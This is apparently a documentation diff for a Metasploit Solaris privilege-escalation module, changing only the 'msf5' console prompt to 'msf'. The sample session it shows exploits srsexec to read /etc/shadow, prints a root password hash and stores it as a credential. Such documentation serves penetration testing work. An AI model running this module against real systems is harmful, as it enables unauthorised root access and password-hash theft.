@@ -39,7 +39,7 @@
 ### Solaris 10 u9 with mock binary and python 2.4
 
 ```
-msf5 post(solaris/escalate/srsexec_readline) > run
+msf post(solaris/escalate/srsexec_readline) > run
 
 [+] 3.2.4 is vulnerable
 [+] Raw Command Output: verify_binary(vFYZf)
@@ -53,7 +53,7 @@ see SYSLOG(/var/adm/messages) for errors
 [+] First line of /etc/shadow: root:MW7h.vpI1Kq1g:17599::::::
 [+] Adding root's hash to the credential database.
 [*] Post module execution completed
-msf5 post(solaris/escalate/srsexec_readline) > creds
+msf post(solaris/escalate/srsexec_readline) > creds
 Credentials
 ===========
 
